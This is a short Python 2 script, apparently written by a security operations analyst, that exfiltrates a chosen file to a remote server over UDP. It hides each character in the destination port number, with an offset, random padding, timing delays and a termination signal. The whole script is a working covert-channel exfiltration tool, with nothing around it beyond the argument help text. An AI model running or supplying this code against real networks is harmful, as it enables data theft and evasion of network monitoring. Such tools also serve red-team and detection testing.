#!/usr/bin/python

#Matt Lichtenberger
#Security Operations Center Analyst
#UPS Inc.
#mlichtenberger@ups.com

import socket
import base64
import string
import time
import sys
import argparse 
import random

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
parser = argparse.ArgumentParser(description="Exfiltrate data to a remote server by bouncing packets off the remote firewall.")
parser.add_argument("-d", "--delay", type=float, help="Packet send delay in seconds (can be decimal increments)", required=True)
parser.add_argument("-e", "--encoding", help="Encoding to use", choices=["null","b16","b32","b64"], required=True)
parser.add_argument("-f", "--file_path", help="Path to file you wish to exfiltrate", required=True)
parser.add_argument("-o", "--offset", type=int, help="Offset to shift port numbers by", required=True)
parser.add_argument("-s", "--serv", help="Remote server to bounce packets off of", required=True)
parser.add_argument("-t", "--term_sig", type=int, help="What character (in DEC) to terminate the conversation with? This needs to be outside your encoding scheme, or else your data payload may terminate prematurely.", required=True)
parser.add_argument("-v", "--verbose", help="Debug messages", action="store_true")
args = parser.parse_args()
offset = args.offset
term_sig = args.term_sig
serv = args.serv
time_val = args.delay
verbose = args.verbose 
file_path = args.file_path
encoding = args.encoding
if(verbose):
	print "Packet offset is "+str(offset)
	print "Server address is "+serv
	print "Packet delay is "+str(time_val)
	print "File path is "+file_path
	print "Encoding is "+encoding

#Parameter Checking
try:
	open(file_path)
except IOError:
	print("Please check your file path to confirm that the file exists.")
	sys.exit(1)

with open(file_path) as fileobj:	
	to_encode = ""
	for word in fileobj:
		to_encode+=word
	if(encoding=="null"):
		encoded = to_encode
	elif(encoding=="b16"):
		encoded = base64.b16encode(to_encode)
	elif(encoding=="b32"):
		encoded = base64.b32encode(to_encode)
	elif(encoding=="b64"):
		encoded = base64.b64encode(to_encode)
	else:
		pass #Uh-oh.
	if(verbose):
		print "Sending the following encoded string:" + encoded + " with the encoding of "+encoding
	for ch in encoded:
		payload = ''.join([random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(random.randrange(50))]) #Output random hex bytes into payload of file, between 0 and 50 of them.
		s.sendto(payload, (serv, ord(ch)+offset))
		time.sleep(time_val)
	if(verbose):
		print "Sending termination character"
	s.sendto(''.join([random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(random.randrange(50))]), (serv, term_sig+offset))